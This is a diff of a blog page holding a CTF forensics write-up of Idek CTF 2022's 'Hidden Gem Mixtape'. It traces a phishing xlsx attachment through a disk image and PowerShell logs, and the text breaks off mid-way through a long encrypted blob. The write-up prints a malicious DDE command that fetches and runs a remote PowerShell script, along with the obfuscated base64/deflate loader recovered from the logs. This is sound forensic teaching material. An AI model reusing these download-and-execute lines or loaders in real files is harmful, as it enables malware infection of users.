@@ -8,11 +8,11 @@
 <title>Hidden Gem Mixtape - Writeup | Journal of Connar</title>
 <meta name="keywords" content="">
 <meta name="description" content="Intro
-This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author bquanman for providing the chall and giving me the change to play them after 3 years:D
-In this challenge we are given a .pcap file and a .vhdx file. Without having the description, and since the challenge provided a network traffic file and a virtual filesystem, I assumed that something malicious happened and thereafter a pcap was generated to analyze a possibly maliciously established connection/data exfiltration. So I started analyzing the .vhdx file.">
+This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author bquanman for providing the chall and giving me the chance to play them after 3 years:D
+In this challenge we are given a .pcap file and a .vhdx file and the challenge consists of 3 parts.">
 <meta name="author" content="connar">
 <link rel="canonical" href="http://localhost:1313/ctfwriteups/hgm/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -77,7 +77,7 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
         <div class="logo">
             <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
@@ -151,7 +151,7 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
     <h1 class="post-title entry-hint-parent">
       Hidden Gem Mixtape - Writeup
     </h1>
-    <div class="post-meta">22 min&nbsp;·&nbsp;connar
+    <div class="post-meta">25 min&nbsp;·&nbsp;connar
 
 </div>
   </header> <div class="toc">
@@ -169,12 +169,12 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
                     <a href="#part-2---credential-access-and-privesc" aria-label="Part 2 - Credential Access and PrivEsc">Part 2 - Credential Access and PrivEsc</a><ul>
                         
                 <li>
-                    <a href="#part-1-mimikatz---errordmp-file" aria-label="[Part 1] Mimikatz - error.dmp file">[Part 1] Mimikatz - error.dmp file</a></li>
+                    <a href="#first-half-of-the-flag-mimikatz---errordmp-file" aria-label="[First half of the flag] Mimikatz - error.dmp file">[First half of the flag] Mimikatz - error.dmp file</a></li>
                 <li>
-                    <a href="#part-2-mimikatz---db79ff0c49c20d542f3690c933ac3046-possible-dpapi-file" aria-label="[Part 2] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file">[Part 2] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file</a></li></ul>
+                    <a href="#second-half-of-the-flag-mimikatz---db79ff0c49c20d542f3690c933ac3046-possible-dpapi-file" aria-label="[Second half of the flag] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file">[Second half of the flag] Mimikatz - DB79FF0C49C20D542F3690C933AC3046 possible DPAPI file</a></li></ul>
                 </li>
                 <li>
-                    <a href="#part-3--" aria-label="Part 3 -">Part 3 -</a>
+                    <a href="#part-3---dns-exfiltration-and-reconstruction" aria-label="Part 3 - DNS Exfiltration and reconstruction">Part 3 - DNS Exfiltration and reconstruction</a>
                 </li>
             </ul>
         </div>
@@ -182,15 +182,16 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
 </div>
 
   <div class="post-content"><h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
-<p>This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author <strong>bquanman</strong> for providing the chall and giving me the change to play them after 3 years:D</p>
-<p>In this challenge we are given a <code>.pcap</code> file and a <code>.vhdx</code> file. Without having the description, and since the challenge provided a network traffic file and a virtual filesystem, I assumed that something malicious happened and thereafter a pcap was generated to analyze a possibly maliciously established connection/data exfiltration. So I started analyzing the <code>.vhdx</code> file.</p>
+<p>This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author <strong>bquanman</strong> for providing the chall and giving me the chance to play them after 3 years:D</p>
+<p>In this challenge we are given a <code>.pcap</code> file and a <code>.vhdx</code> file and the challenge consists of 3 parts.</p>
+<p>The description of the part 1 states as follows:</p>
+<pre tabindex="0"><code>We&#39;re pretty sure there&#39;s been a hack into our system. The incident is suspected to be caused by an employee opening a document file received via email even though he deleted it shortly afterwards. We managed to do a logical acquisition of data from his hard drive. However, when we open the document file, it looks empty, can you analyze what it contains?
+</code></pre><p>This gives out a hint into looking for an email with a malicious attachment, so let&rsquo;s start analyzing the <code>.vhdx</code> filesystem to maybe find out such an email.</p>
 <h2 id="part-1---analyzing-initial-access">Part 1 - Analyzing initial Access<a hidden class="anchor" aria-hidden="true" href="#part-1---analyzing-initial-access">#</a></h2>
 <p>To analyze filesystems, usually you will go with Autopsy or FTK Imager. Since I did not have a Raw file or an E01 one, and since I had issues converting the <code>.vhdx</code> into one of the forementioned filetypes, I just mounted the provided <code>.vhdx</code> (just right click-&gt; Mount) and then loaded the <code>C:\\</code> folder of the mounted drive into the logical files of Autopsy, which yielded the result I was looking for:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/autopsy1.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/autopsy1.png"></p>
 <p>Searching a bit and thinking of all the possible initial ways to infliltrate a machine, we land on the following sus email:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/autopsy2.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/autopsy2.png"></p>
 <p>Downloading the attachment and decompressing the file with the given password, we get a file named <code>Policy.xslx</code>. If we upload it in any online tool such as virus total or any.run, we will see that this is definitely a malicious file. If we manually want to see the part it is malicious at, we can extract the files of the <code>xslx</code> (since xlsx,doc, docx etc contain other files that have been put together):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>└─$ unzip Policy.xlsx 
 </span></span><span style="display:flex;"><span>Archive:  Policy.xlsx
@@ -205,9 +206,8 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
 </span></span><span style="display:flex;"><span>./xl/externalLinks/externalLink1.xml:&lt;externalLink xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> xmlns:mc<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/markup-compatibility/2006&#34;</span> mc:Ignorable<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x14&#34;</span> xmlns:x14<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main&#34;</span>&gt;&lt;ddeLink xmlns:r<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;</span> ddeService<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd&#34;</span> ddeTopic<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/c powershell.exe -w hidden </span>$e<span style="color:#e6db74">=(New-Object System.Net.WebClient).DownloadString(\&amp;quot;http://172.21.20.96/windowsupdate.ps1\&amp;quot;);IEX </span>$e<span style="color:#e6db74">&#34;</span>&gt;&lt;ddeItems&gt;&lt;ddeItem name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_xlbgnm.A1&#34;</span> advise<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>/&gt;&lt;ddeItem name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;StdDocumentName&#34;</span> ole<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> advise<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>/&gt;&lt;/ddeItems&gt;&lt;/ddeLink&gt;&lt;/externalLink&gt;
 </span></span></code></pre></div><p>We can see the following dde data:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-d" data-lang="d"><span style="display:flex;"><span>ddeService<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd&#34;</span> ddeTopic<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&amp;quot;http://172.21.20.96/windowsupdate.ps1\&amp;quot;);IEX $e&#34;</span>
-</span></span></code></pre></div><p>If we try to access this IP to download the powershell script, we will not be able to retrieve it as it is no longer available. But we remember that we have the whole filesystem, and thus we probably can retrieve the data of this <code>windowsupdate.ps1</code> from the powershell logs of the system. Searching in Autopsy for the IP, we get three hits back:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/autopsy3.png" alt="alt text"  />
-</p>
+</span></span></code></pre></div><p>If we try to access this IP to download the powershell script, we will not be able to retrieve it as it is a local IP in which we don&rsquo;t have access to. But we remember that we have the whole filesystem, and thus we probably can retrieve the data of this <code>windowsupdate.ps1</code> from the powershell logs of the system. Searching in Autopsy for the IP, we get three hits back:</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/autopsy3.png"></p>
 <p>Looking around the powershell logs, we will find out that the contents of this <code>windowsupdate.ps1</code> is the following obfuscated code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>&amp; ( $sHEllid[<span style="color:#ae81ff">1</span>]+$sheLLiD[<span style="color:#ae81ff">13</span>]+<span style="color:#e6db74">&#39;X&#39;</span>)( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [<span style="color:#66d9ef">SyStem.iO.mEMOrySTream] [SysteM.cOnVerT</span>]::FRomBase64STRINg( <span style="color:#e6db74">&#39;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&#39;</span> ) , [<span style="color:#66d9ef">sySteM.IO.ComprESsiON.cOmpresSiONMODe</span>]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct  iO.sTReAMrEAder( $_ , [<span style="color:#66d9ef">TExT.EncOdiNg</span>]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )})
 </span></span></code></pre></div><p>The obfucsated powershell code constructs the <code>iex</code> word for executing the obfuscated powershell code. We know that it uses <code>iex</code> from the <code>&amp; ( $sHEllid[1]+$sheLLiD[13]+'X')</code> part, which we can validate through a powershell terminal:</p>
@@ -218,8 +218,7 @@ In this challenge we are given a .pcap file and a .vhdx file. Without having the
 </span></span><span style="display:flex;"><span>i
 </span></span><span style="display:flex;"><span>e
 </span></span></code></pre></div><p>For the rest of the payload, we only need to decode from base64 and decompress:</p>
-<p><img loading="lazy" src="/posts/writeups/training/idek2022/cyberchef_payloadDecode.png" alt="alt text"  />
-</p>
+<p><img alt="alt text" loading="lazy" src="/posts/writeups/training/idek2022/cyberchef_payloadDecode.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL <span style="color:#e6db74">&#39; &#39;</span>, (<span style="color:#e6db74">&#39;76492d1116743f0423413b16050a5345MgB8AHUAQgAxAEsAZQBQAE8AUQA4AHQAVAB5ADEAcwBXAFYALwBVADcAUAAyAGcAPQA9AHwAMQAzADcAMwAwAGIAOQA2ADMANQAwAGYAOABlADUAOQAxAGEAMgA4ADAAOQAzAGQAMABjADYAZgA2ADQAOAAxAGYAZAA4AGUAMAA2ADIANABmADQAMgAzADMAYwAxAGQANgA4ADEANgAwADcANgA1AGYANgBjAGUAZQA1ADAAMwA4ADMAZQA5AGMAOQAzAGUAYgBhAGIANgA1ADEANQBjAGYAYwBiADIAOQA2ADcAYgA4AGEAZAA3AGYANABhAGYAYgA2ADgANQAyADkAOAA1ADUAYQA2ADkAMwAzADMANwBkADIAOQA1ADkAZgBhADkANAA1AGYANwA1ADIAZAA2AGMAMgBhADYANQBjADAAYwA4AGEAYQA0AGYAZQBiAGUAYgA2AGQAOQA4AGIAOAA1AGYAZAA1ADMANgBkADYANQBkADMAZQBiADAANQBjADkAMABmADMANQA0AGYAOQBiADMAMQA2ADkAOQAyADcAZgA2ADcAZgBiADAAYQAxAGYANAAzAGIAYQBjADQANwA2ADgAYwA4ADYAOAA2ADcAYwA2ADAAZABkADkAOQAwADAAYgAzADYAMgA2ADUAZQA0AGYANAA2AGEAYgAwAGMAOAAwADAANQA4ADkANQBlAGYAYwBhADkANAAwADEANgBkADgAMwAzAGEAYQBlADMAMgAxAGEAMQBiADAAMwAwADQANQA1ADQAYQAzADIAYwA4AGQAZQBkADUAZABlAGIAMwA2ADgAYgA4AGYANAAyADUAZAAxADIAOAA0AGYANwA2ADcAMABjADMAOAA1ADMAMwAyADkAZQA2AGEANwBmADAAZAA2ADUAMwBkADkAYgAzADcAMgA4ADEAZAA2AGIANwAwADUAYwA0ADMAYQAwAGUAZgA0ADYAZQBiADkAYgA5ADcANQA5ADkAYQA0ADEAMgBhADQAYQA4ADYAMQBhADIAYgA4ADcANwAzADIAMABjADIAMQA3ADgAYwA0ADIAYwA0ADYAZgAwAGIANQBmAGEAYQA3AGIANQBlADMANgAwAGEANwAwAGMAMgBlADgAYQA5ADAAYwBlADkAMgBjADgAMgA3ADIAMAA4ADMANwBiAGQANAA1AGYAOQBlADQANABkADkAMgBiADAAZQBiADgAYgA4ADQAZQA2AGQANgBlADAAYgA5ADcANQBhAGQAYQA2ADMAZgAwADcAMAA3ADcAYgA5AGYAYwAxADcANQBjADUANgAwAGMAZQA4ADYAZAA4ADkAZABhADgAOQA1AGQAMQA5AGEAMQAzADUANgAxADUAMAAyAGQANgA2AGMAZQBmAGQAYwBlADUAMABiADAAYQA5ADIAOABlADMAZABkAGUANAAzADIAZgAwAGEANgA3ADkANQA3ADYANgA3ADIAOQBjAGUANgBkADQAZAAwAGUAZAAwADgAZAA5ADQANgBlADYAMwAyADIANQAyADkANABmADgAYwA5ADkAMAA0AGQAZgBkADEAYwAxAGUAOQAxADcAZgAyAGMANQBkAGYAMwAzADMANgBlAGEAZgBmAGMANgBjAGMAZABkAGQAMAA5ADAAZQAzADQAZAAwADYAZAAyADUAMwA2AGMANgA2ADAANAAyADUANgA2ADUAYwA0ADQAZQAyADIAMgBmADAANQAyAGEAYwA5ADAAZAAzADYAZAAzAGYAYQA2AGEAOAA0ADIAOQAwADAAMQAwAGYAOQBhADAAMwBkAGYAMQBiAGMANgAwAGMAZAA4ADEANAA5AGEAMwAyAGQAOQBlADcANwBkADEAYQBiADUANQA0ADIAZABhADQANwBmADAAYQA2ADYAMAAyADEANABmADAAMgAyAGEAMQAxAGQANgBjADgAOQA2ADYAYgA1AGQANQAwADIAMwBiADQANwAxADkAZgA5AGIANAA4AGQAYwAwADAANABiADIANgA2ADEAMwAwADIAYQA1ADIAOQA2ADgAOQBmADgANgAwAGUAYwAyAGUANwAyAGUANAA1AGEAZABhAGEAMgA5ADQAZQAxAGUAMgA0ADcAMQAzAGYANAAyADMAYQAzAGMAZgBlAGEANQA0ADQAYQBmADEAZAA1AGYANQBiADQANQA2ADgAZQBhAGYAZQA4ADYAYgBhADgAMgBjADAAZQBjADIAMQAyADQAMgAyADAANAA4ADAAMAAyAGIAMgBiAGQANwBjAGYAYQA3ADIAMABhAGMANgA1AGYAZgA4ADcAZQA2ADcANwA5AGQAMAA2AGEANgBlADkAZgA1AGIAOQA0AGEAMwBiADAANgA4ADMAZAAwADQANQBkAGIAYwBmAGEANwBiADkAMAA1ADgAMABiAGYAYgA1AGEAMgAxAGUAMQA0ADgANgAzADgAYQAwADcANQBlADUAYgA5AGUAYgAxADQANQA2AGQAYgAzADEAZgA0AGQAZQBiADMAZABlADIANQBiAGYANgA5AGUANQA5ADYAYgA4AGEAMgBjADcAYgA5ADUAOAAxAGMAZQAwADcAZAAzADQAMwA0ADIAMwA5ADMAYQAyADUAMQBkADUAYgBlADQANABmADgAMgBiADYAMgA3ADgAYgAxAGMAMQBhAGMANQAyAGQANgBlADcANAA1AGYANAA5ADMAMAA5ADcANwBkAGIAMwA0AGUAYQBjADEANwAwAGUAZQBhADEAZQAzADUAZAA0ADIAYQBjADAAMQA2ADYAOABlADQAMAAxADcANwA4AGUAZABjADgAZAA5AGIAZQA0ADcANgBmADAANwBiADgAOAA4ADIAYgA4AGIAYwA2ADgAZQA3ADgAYQA2AGQAMwAzAGMAZQBlAGUANQAzADIAZQBkAGMAYQBhADkANwBhAGEAOAAwADEAZgA0ADEAMwAxADAAYwA2AGEAZgBmAGMAZgBlADEAYQA5ADcAOAAxADEAOQAwADEAYwBkADIAOQAwAGYANgBhADkAYwBlAGQAYQBmADYAYwBmADYAOAA1ADMAMAAxADQANgA2ADUAZABhADMAYgAwADEAZQAwADgAMwAxADMAMgA5ADYAOQA1AGYANAAwADgAOABjAGYANABmAGEAMgAxADQAZQA3ADUAMgA2ADQAOABhAGMAYgBlADAAYgA2ADcAYwAyAGMAOQA0AGIAMwBlAGIANAAxADkAMwAyAGIAZQBhADMANQA4AGUAOQBkAGQANQA3AGUAYgAyADcAZABmADQAZQBiADQAOQBmADQAMAA5AGEAOABhADYAOABhAGIAZQBlADAAYQA2ADUAZgA3ADEANQBkADIANABiADcAYwAxAGIANQAwADgAZQBlAGUAMQBjAGEANAA1ADYAMgBiAGYAMwA4ADAAMwBiADIAZgAwADAAYQAxADEAOAAwADQAYgA3ADcAMwBhADEANABkAGQANQA1ADQAZgA1AGMAMAA5ADQAOQA0ADAAZgA3AGIAMwA3AGIAMwAxADAAZQBjADQAYQA3ADYAMQBkADQAOQA3AGEAOABiAGYAZgBhAGMAZQAyADAAMgA3ADIAOQAxADIAZgBhADQAYwBhADkAYwA4ADAANwA0ADUANwAyADgAZQAzADUAMQBlADIAMgA1ADYAMAAwADAAOAAyAGIAYQA4AGYAZQBiAGEAMAA3AGYAMgBjAGIANgBkAGMAZgAxAGIAYgA4ADEAMgA4ADAANQA3ADMANAA3ADcAOQA5AGUANQA2ADUAMQAwAGQANAA1AGYANQAyAGQAYwBiADUAZgAzADgAMABmADIANwAxAGMAZQBhAGYAOABiADUANQBiAGQAZgBkAGMAMABjAGIANwBjADAANAA5AGYAZABkADAAMgAwADAAYwA5ADcAYwA3ADQANwBkADQAYgAwAGYAZABkAGYAMwAzADUAZQAwADgAZAAyADIAYQA4ADQAOQBlADgAZgBjAGMAMgAzADcANAAyADcAZgBhADMAZgA4ADUAMgBhADAANQAxADkAYgAyAGQAYwBjADQAOQA1ADUANwAwADUAYgA0ADgAOQBkADEAYwAzADgAMAA3ADUAOAA5AGEAYQBiADYAZQA5ADEAYQAxADMAMgBkADYAZAA5ADYAMQAzAGQAZAA2AGYANQAyAGQANgA1ADIAMAA5ADUAYgA2AGEAZQBjADkAMQBhAGIANQAyADUAMwA5ADQAMAAyADUAOQA0ADgAZgBmADgANAAwADYAMwBmAGIAMAA4AGQAZgA0ADUAYwAyAGQAOQAwADYANgA5ADkAOABiAGYANAA1ADYAMQAyADUANQA1ADAAYwAzADUAYgAwAGQAMgA0ADUAZAA0AGUAYwAyAGYAMABkADAAOAA1ADgAYgA0ADcANAA1ADIAMAAwADIANwBlADYAYgA2ADUAOABlADMAYgA3ADYAYgBmAGQANQA2ADYAZAAyADYAYwA4ADcANQAzADcAOABjAGMAMQBlADQANABmAGUAOQBhADUAYQBlADkAZABkAGMANQA2ADAAMQBmADYAMAAxADEAOQA3AGIAYwBiAGUANwA2ADIAZAA4ADkAYQA4AGEAMgBlAGQAMgA4ADQANAA4ADcANAA4AGEAYgA0AGIAMgA5ADgAOQBhAGUAMQAzADUAMwBkADMAMAA5ADMANQA1ADMAMQAyADEAYQBhADkAOAA2ADgAOQBlAGEANwA2ADIANAA3ADgAOQAzAGEAYwA0ADkAYgBhAGMAMwBmAGQAZABiADYAZgA3ADAAZABkADIAMQA3ADAAYQA4ADQAOQBlADYANgAxADkAYQA3ADMAMgA0ADgAOQA2ADcAOQBkADEAYQBmAGYANwAzADcAYgA0ADAANgAzADgAZAA1AGYAZgBkADgAOQBjAGIAZgA4ADYAOAAwADcAOQBkADYAMAAxADYAMgBmADcANAAwAGUAOAA4ADYANQAzAGYAMwA5ADMAZQAxADYAMgBmADIAZABjAGEAMAA3ADIAMAA1AGQAYQA5AGYAOABkADMAZAA2AGYAMgAxAGQAYwA0ADAAMgAwADMANQA4AGUAYQBiADYAMQBlAGQAMAA3ADcAYQBlADgAOQBiADEANQA1ADQAZAA1ADgAMQA3ADQAMwBjAGYANQAxAGUAMQAyAGIAZQBjADIAYgBmADIAZgBlADUANAA3ADQAYQA5ADAANwBjADQANgA0AGEAYQAwADMAZAA0AGEAZQA1AGMAZgAzAGMAYgBlAGEAZQA2ADQAMABiADQAMQBhAGEAZQA5ADcAYwAxADAAZQBiADYAMQAyAGMANQAw